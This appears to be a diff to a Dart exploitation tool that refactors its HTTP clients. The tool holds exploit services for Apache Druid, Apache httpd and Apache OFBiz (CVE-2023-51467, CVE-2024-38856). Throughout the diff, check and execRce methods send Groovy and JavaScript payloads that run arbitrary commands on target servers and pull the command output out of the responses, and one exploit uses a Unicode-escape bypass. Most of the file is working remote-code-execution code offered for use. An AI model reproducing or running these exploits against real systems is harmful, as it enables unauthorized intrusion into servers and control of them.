@@ -1,8 +1,7 @@
 import 'dart:convert';
-import 'dart:io';
 
-import 'package:http/http.dart' as http;
-import 'package:http/io_client.dart';
+import '../../../core/http/http_client.dart';
+import '../../../core/net/raw_http_client.dart';
 
 import 'exp_result.dart';
 import 'rce_encoder.dart';
@@ -19,58 +18,24 @@ class ApacheHttpdExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
+  final RawHttpClient _rawClient = const RawHttpClient();
+
   Future<String?> _sendRawHttp({
     required String method,
     required String rawPath,
     String? body,
     Map<String, String>? headers,
   }) async {
-    final base = Uri.parse(_base);
-    final host = base.host;
-    if (host.isEmpty) return null;
-    final isHttps = base.scheme == 'https';
-    final port = base.hasPort ? base.port : (isHttps ? 443 : 80);
-    final payload = body ?? '';
-    final reqHeaders = <String, String>{
-      'Host': base.hasPort ? '$host:$port' : host,
-      'Connection': 'close',
-      ...?headers,
-    };
-    if (payload.isNotEmpty) {
-      reqHeaders['Content-Length'] = utf8.encode(payload).length.toString();
-    }
-    final headerText = reqHeaders.entries
-        .map((e) => '${e.key}: ${e.value}')
-        .join('\r\n');
-    final request = StringBuffer()
-      ..write('$method $rawPath HTTP/1.1\r\n')
-      ..write('$headerText\r\n\r\n')
-      ..write(payload);
-
-    Socket? socket;
-    try {
-      socket = isHttps
-          ? await SecureSocket.connect(host, port,
-              timeout: timeout, onBadCertificate: (_) => true)
-          : await Socket.connect(host, port, timeout: timeout);
-      socket.write(request.toString());
-      await socket.flush();
-
-      final bytes = await socket
-          .cast<List<int>>()
-          .timeout(timeout)
-          .expand((chunk) => chunk)
-          .toList();
-      final text = utf8.decode(bytes, allowMalformed: true);
-      final idx = text.indexOf('\r\n\r\n');
-      return idx >= 0 ? text.substring(idx + 4) : text;
-    } catch (_) {
-      return null;
-    } finally {
-      try {
-        await socket?.close();
-      } catch (_) {}
-    }
+    final res = await _rawClient.send(
+      baseUrl: _base,
+      request: RawHttpRequest(
+        method: method,
+        rawPath: rawPath,
+        headers: headers ?? const {},
+        body: body ?? '',
+      ),
+    );
+    return res?.body;
   }
 
   Future<ExpResult> check() async {
@@ -176,6 +141,12 @@ class DruidExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
   String _buildPayload(String cmd) {
     final safeCmd = RceEncoder.escapeDoubleQuoted(cmd);
     final jsFunction =
@@ -206,15 +177,13 @@ class DruidExpService {
 
   Future<ExpResult> check() async {
     try {
-      final res = await http
-          .post(
-            Uri.parse('$_base/druid/indexer/v1/sampler'),
-            headers: {'Content-Type': 'application/json'},
-            body: _buildPayload('id'),
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/druid/indexer/v1/sampler',
+        headers: {'Content-Type': 'application/json'},
+        body: _buildPayload('id'),
+      );
       if (res.statusCode == 200) {
-        final decoded = jsonDecode(res.body);
+        final decoded = jsonDecode(res.body ?? '');
         final data = decoded['data']?.toString() ?? '';
         if (data.isNotEmpty) {
           return ExpResult(
@@ -230,15 +199,14 @@ class DruidExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final res = await http
-          .post(
-            Uri.parse('$_base/druid/indexer/v1/sampler'),
-            headers: {'Content-Type': 'application/json'},
-            body: _buildPayload(cmd),
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/druid/indexer/v1/sampler',
+        headers: {'Content-Type': 'application/json'},
+        body: _buildPayload(cmd),
+      );
       if (res.statusCode == 200) {
-        final decoded = jsonDecode(res.body);
+        final body = res.body ?? '';
+        final decoded = jsonDecode(body);
         final rows = decoded['data'] as List?;
         if (rows != null && rows.isNotEmpty) {
           final first = rows.first as Map?;
@@ -246,9 +214,9 @@ class DruidExpService {
           final input = first?['input'] as Map?;
           return parsed?['test']?.toString() ??
               input?['test']?.toString() ??
-              res.body;
+              body;
         }
-        return res.body;
+        return body;
       }
     } catch (_) {}
     return null;
@@ -286,15 +254,14 @@ class OFBizExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
-  http.Client _client() {
-    final ioClient = HttpClient()
-      ..badCertificateCallback =
-          ((X509Certificate cert, String host, int port) => true);
-    return IOClient(ioClient);
-  }
-
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
+
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: true,
+  );
 
   static const List<String> _programExportPaths = [
     '/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
@@ -327,7 +294,6 @@ class OFBizExpService {
   }
 
   Future<ExpResult> checkCve202351467() async {
-    final client = _client();
     try {
       final marker = 'MATRIX_${DateTime.now().millisecondsSinceEpoch}';
       final payload = "throw new Exception('echo $marker'.execute().text);";
@@ -335,14 +301,12 @@ class OFBizExpService {
       for (final base in _candidateBases()) {
         for (final path in _programExportPaths) {
           try {
-            final res = await client
-                .post(
-                  Uri.parse('$base$path'),
-                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
-                )
-                .timeout(timeout);
-            final body = res.body;
+            final res = await _httpClient.post(
+              '$base$path',
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: 'groovyProgram=${Uri.encodeComponent(payload)}',
+            );
+            final body = res.body ?? '';
             if (body.contains(marker) ||
                 body.contains('java.lang.Exception') ||
                 body.contains('groovy.lang') ||
@@ -358,30 +322,26 @@ class OFBizExpService {
         }
       }
     } catch (_) {
-    } finally {
-      client.close();
     }
     return const ExpResult(false, 'CVE-2023-51467', '');
   }
 
   Future<ExpResult> checkCve202438856() async {
-    final client = _client();
     try {
       const body =
           '------WebKitFormBoundaryMAtrix911\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception("OFBiz_CVE_2024".class.nam\u0065);\r\n------WebKitFormBoundaryMAtrix911--';
-      final res = await client
-          .post(
-            Uri.parse('$_base/webtools/control/main/ProgramExport'),
-            headers: {
-              'Content-Type':
-                  'multipart/form-data; boundary=----WebKitFormBoundaryMAtrix911',
-            },
-            body: body,
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/webtools/control/main/ProgramExport',
+        headers: {
+          'Content-Type':
+              'multipart/form-data; boundary=----WebKitFormBoundaryMAtrix911',
+        },
+        body: body,
+      );
+      final bodyText = res.body ?? '';
       if (res.statusCode == 200 ||
-          res.body.contains('java.lang') ||
-          res.body.contains('content-messages')) {
+          bodyText.contains('java.lang') ||
+          bodyText.contains('content-messages')) {
         return ExpResult(
           true,
           'CVE-2024-38856',
@@ -389,14 +349,11 @@ class OFBizExpService {
         );
       }
     } catch (_) {
-    } finally {
-      client.close();
     }
     return const ExpResult(false, 'CVE-2024-38856', '');
   }
 
   Future<String?> execRce(String cmd) async {
-    final client = _client();
     try {
       final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final payload =
@@ -406,20 +363,18 @@ class OFBizExpService {
       for (final base in _candidateBases()) {
         for (final path in _programExportPaths) {
           try {
-            final res = await client
-                .post(
-                  Uri.parse('$base$path'),
-                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
-                )
-                .timeout(timeout);
+            final res = await _httpClient.post(
+              '$base$path',
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: 'groovyProgram=${Uri.encodeComponent(payload)}',
+            );
 
             // OFBiz renders the exception message in various HTML elements.
             // Match everything after "java.lang.Exception:" until the next tag.
             final match = RegExp(
               r'java\.lang\.Exception:\s*([^<]+)',
               caseSensitive: false,
-            ).firstMatch(res.body);
+            ).firstMatch(res.body ?? '');
 
             String? out = match?.group(1)?.trim();
             if (out != null) {
@@ -443,14 +398,11 @@ class OFBizExpService {
       return null;
     } catch (_) {
       return null;
-    } finally {
-      client.close();
     }
   }
 
   /// CVE-2024-38856: multipart POST to /main/ProgramExport with Unicode bypass.
   Future<String?> execRce38856(String cmd) async {
-    final client = _client();
     try {
       final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final groovyCode =
@@ -462,21 +414,18 @@ class OFBizExpService {
           '$groovyCode\r\n'
           '--$boundary--';
 
-      final res = await client
-          .post(
-            Uri.parse('$_base/webtools/control/main/ProgramExport'),
-            headers: {
-              'Content-Type':
-                  'multipart/form-data; boundary=$boundary',
-            },
-            body: body,
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/webtools/control/main/ProgramExport',
+        headers: {
+          'Content-Type': 'multipart/form-data; boundary=$boundary',
+        },
+        body: body,
+      );
 
       final match = RegExp(
         r'java\.lang\.Exception:\s*([^<]+)',
         caseSensitive: false,
-      ).firstMatch(res.body);
+      ).firstMatch(res.body ?? '');
 
       String? out = match?.group(1)?.trim();
       if (out != null) {
@@ -493,8 +442,6 @@ class OFBizExpService {
       return out?.isNotEmpty == true ? out : null;
     } catch (_) {
       return null;
-    } finally {
-      client.close();
     }
   }
 }
